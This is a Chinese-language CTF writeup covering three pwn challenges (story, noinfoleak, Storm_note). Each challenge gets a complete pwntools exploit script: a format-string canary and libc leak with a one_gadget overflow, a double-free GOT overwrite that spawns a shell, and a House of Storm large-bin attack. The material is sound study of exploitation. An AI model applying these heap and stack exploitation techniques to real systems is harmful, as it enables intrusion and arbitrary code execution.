---
layout: post
title:  "2019.04.08 西湖论剑网络安全技能大赛线上预选赛"
tags: [writeup, pwn, heap, ctf]
date: 2019-04-08
comments: false
---

# 西湖论剑线上预选赛pwn writeup







## story

checksec:

![5cab40a970813](https://i.loli.net/2019/04/08/5cab40a970813.png)

主函数

![5cab405c514f8](https://i.loli.net/2019/04/08/5cab405c514f8.png)

格式化字符串

![5cab40b6079bc](https://i.loli.net/2019/04/08/5cab40b6079bc.png)

栈溢出，不过有canary

![5cab40bd10829](https://i.loli.net/2019/04/08/5cab40bd10829.png)

通过格式化字符串泄露canary和libc(栈上有个位置储存着__libc_start_main+240)。

![5cab41ea0d77d](https://i.loli.net/2019/04/08/5cab41ea0d77d.png)

通过栈溢出跳到onegadget。

exploit:

```python
#!/usr/bin/env python
# -*- coding=utf8 -*-
"""
# Author: le3d1ng
# Created Time : 2019年04月07日 星期日 11时25分01秒
# File Name: exp.py
# Description:
"""
from pwn import *

io = process('./story')
context.log_level = 'debug'
context.terminal = ['terminator' , '-x' , 'sh' , '-c']
def debug():
    gdb.attach(io)
    io.interactive()
io.recv()

payload = "%15$lx,%25$lx"
io.sendline(payload)
io.recvuntil("Hello ")
canary = int(io.recv(16),16)
print hex(canary)
io.recv(1)

leak = int(io.recv(12),16)
libcbase = leak - 0x20830
print hex(libcbase)
'''
0x45216    execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a    execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4    execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147    execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
onegadget = 0x45216 + libcbase
popraxret = 0x0000000000033544 + libcbase

#debug()
payload = p64(0)*17 +p64(canary) + p64(0) + p64(popraxret) + p64(0) + p64(onegadget)
io.recv()
io.sendline('150')
io.recv()
io.send(payload)

io.interactive()
```

## noinfoleak

checksec:

![5cab425c4d034](https://i.loli.net/2019/04/08/5cab425c4d034.png)

main:

![5cab42901b2aa](https://i.loli.net/2019/04/08/5cab42901b2aa.png)

add:

![5cab42a8ad674](https://i.loli.net/2019/04/08/5cab42a8ad674.png)

edit:

![5cab42c4531b4](https://i.loli.net/2019/04/08/5cab42c4531b4.png)

del:

![5cab42d6ef46b](https://i.loli.net/2019/04/08/5cab42d6ef46b.png)

没有能leaklibc的功能，自己造一个，把free@got覆写成puts@plt。

通过2free，将堆块建到ptr上某个位置，恰好ptr有存size的地方，可以用来伪造chunksize。

改写ptr中chunk1指针为free@got,chunk2指针为atoi@got，edit chunk1内容为puts@plt

free(chunk2)泄露libc，改写chunk1为system，添加chunk3，内容为/bin/sh\x00，free(chunk3) getshell。

本来想的是用2free把堆块直接建到free@got上方，再通过unsorted bin的fd和bk泄露libc，结果没成功。  







```python
#!/usr/bin/env python
# -*- coding=utf8 -*-
"""
# Author: le3d1ng
# Created Time : 2019年04月07日 星期日 13时55分42秒
# File Name: exp.py
# Description:
"""

from pwn import *

io = process('./noinfoleak')
#io = remote('ctf2.linkedbyx.com',10776)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./noinfoleak')
context.log_level = 'debug'
context.terminal = ['terminator', '-x' , 'sh' ,'-c']



def debug():
    gdb.attach(io)
    io.interactive()
def addnote(size,content):
    io.sendafter('>','1')
    io.sendafter('>',str(size))
    io.sendafter('>',content)
def delnote(idx):
    io.sendafter('>','2')
    io.sendafter('>',str(idx))
def editnote(idx,content):
    io.sendafter('>','3')
    io.sendafter('>',str(idx))
    io.sendafter('>',content)
'''
pwndbg> x/64gx 0x601002-8
0x600ffa:    0x0e28000000000000    0xd168000000000060
0x60100a:    0xde1000007fa47538    0x04f000007fa47517
0x60101a:    0xd29000007fa474e2    0x06b600007fa474e0
0x60102a:    0x06c6000000000040    0xe970000000000040
0x60103a:    0x820000007fa474f0    0x325000007fa474e6
0x60104a:    0xc74000007fa474e9    0x013000007fa474db'''

ptr = 0x6010A0

putplt = elf.plt['puts']

putchargot = 0x601020
freegot = 0x601018

addnote(0x60,'aaa')
addnote(0x60,'bbb')
addnote(0x60,'ccc')
addnote(0x70,'ddd')
addnote(0x60,'eee') #4
addnote(0x60,'fff') #5
addnote(0x60,'/bin/sh\x00') #6
#addnote(0x79,'ggg')
#delnote(3)

delnote(1)
delnote(2)
delnote(1)
#debug()
addnote(0x60,p64(0x6010d0))
addnote(0x60,'ddd')
addnote(0x60,'eee')

addnote(0x60,p64(freegot)+p64(0x60)+p64(putchargot))

editnote(4,p64(putplt))

delnote(5)

#debug()
leakaddr = u64(io.recv(6).ljust(8,'\x00'))
libcbase = leakaddr - libc.symbols['putchar']
print hex(leakaddr),hex(libcbase)
sysaddr = libcbase + libc.symbols['system']

editnote(4,p64(sysaddr))

delnote(6)
#delnote(0)
io.interactive()
io.recv()
```

## Storm_note

0ctf2018 heapstorm  

就不详细写了。  



checksec:

![5cab4585c9e62](https://i.loli.net/2019/04/08/5cab4585c9e62.png)

![5cab465c51f58](https://i.loli.net/2019/04/08/5cab465c51f58.png)

![5cab46f113bcf](https://i.loli.net/2019/04/08/5cab46f113bcf.png)

后门函数，输入需要与0xabcd0100中数据相同。

![5cab47487b646](https://i.loli.net/2019/04/08/5cab47487b646.png)

add:

可以分配1到0xffff任意大小。

![5cab4786a98c2](https://i.loli.net/2019/04/08/5cab4786a98c2.png)

edit:

off-by-null

![5cab47c8f2472](https://i.loli.net/2019/04/08/5cab47c8f2472.png)

del:

![5cab47d803641](https://i.loli.net/2019/04/08/5cab47d803641.png)

思路：

存在off-by-null，用chunk shrink实现overlapping。为后面修改目标chunk的fd bk等指针做铺垫。

控制出一块unsorted bin(large bin范围) ， 一块large bin。

在malloc时如果在unsorted bin中找不到合适大小的，便将unsorted bin中的large chunk插入到large bin，通过精心构造的fd_nextsize,bk_nextsize等指针，实现mmap区域任意写，同时将fake_chunk加入到unsorted bin中。在目标区域0xabcd0100的上方，利用字节错位写出一个\x56大小的size位，作为fake_chunk的size。  



在它找下一个unsorted bin时，找到fake_chunk，发现大小也符合，便会返回来。向其中写入\x00将随机数覆盖即可。  



exploit:  

```python
#!/usr/bin/env python
# -*- coding=utf8 -*-

from pwn import *

io = process('./Storm_note')

context.log_level = 'debug'
context.terminal = ['terminator' , '-x' , 'sh' , '-c']

def debug():
    gdb.attach(io)
    io.interactive()
def alloc(size):
    io.sendlineafter(': ','1')
    io.sendlineafter('\n',str(size))
def editnote(idx,content):
    io.sendlineafter(': ','2')
    io.sendlineafter('\n',str(idx))
    io.sendafter('\n',content)
def delnote(idx):
    io.sendlineafter(': ','3')
    io.sendlineafter('\n',str(idx))
def fopen():
    io.sendlineafter(': ','666')


storage = 0xABCD0100
fake_chunk = storage - 0x20


alloc(0x18) #0
alloc(0x508) #1
alloc(0x18) #2

editnote(1,'h'*0x4f0+p64(0x500))



alloc(0x18) # 3
alloc(0x508) # 4
alloc(0x18) # 5
editnote(4,'h'*0x4f0+p64(0x500))
alloc(0x18) # 6

delnote(1)
#debug()
editnote(0,'h'*0x18)
alloc(0x18) #1
#debug()
alloc(0x4d8) #7

#debug()
delnote(1)
delnote(2)
#debug()
alloc(0x38) # 1
alloc(0x4e8) # 2
#debug()



delnote(4)
editnote(3,'h'*0x18)
alloc(0x18) #4
alloc(0x4d8) #8
delnote(4) 
delnote(5)
#debug()

alloc(0x48) # 4
#debug()

delnote(2) 
#debug()
alloc(0x4e8) #2
#debug()
delnote(2)


p1 = p64(0)*2 + p64(0) + p64(0x4f1) #size
p1 += p64(0) + p64(fake_chunk)      #bk
editnote(7, p1)

p2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
p2 += p64(0) + p64(fake_chunk+8)    #bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin
p2 += p64(0) + p64(fake_chunk-0x18-5)   #bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks
editnote(8, p2)


alloc(0x48) #2 //important

editnote(2,p64(0)*8)

#debug()

fopen()
io.send('\x00'*0x30)
#debug()

#payload = p64(0) + p64(0x91)
#payload += "A"*224
#payload += p64(0x90)
#editnote(3,payload)
#debug()
io.interactive()
```



![5cab4d78076e9](https://i.loli.net/2019/04/08/5cab4d78076e9.png)

在add0x48时，会先到unsorted bin中找相应大小的chunk，0x5587bac36060大小不符合，会被放入large bins
执行：  

victim->fd_nextsize = fwd;  

victim->bk_nextsize = fwd->bk_nextsize;  

fwd->bk_nextsize = victim;  

victim->bk_nextsize->fd_nextsize = victim;  

....  

....  

victim->bk = bck;  

victim->fd = fwd;  

fwd->bk = victim;  

bck->fd = victim;    





之后会找unsorted bin中下一个chunk，即为我们伪造的fake_chunk-0x20。  

fake_chunk-0x20 位置会是一个大小为0x56的chunk，正好将其分配出来。    





![5cab4db9012bd](https://i.loli.net/2019/04/08/5cab4db9012bd.png)
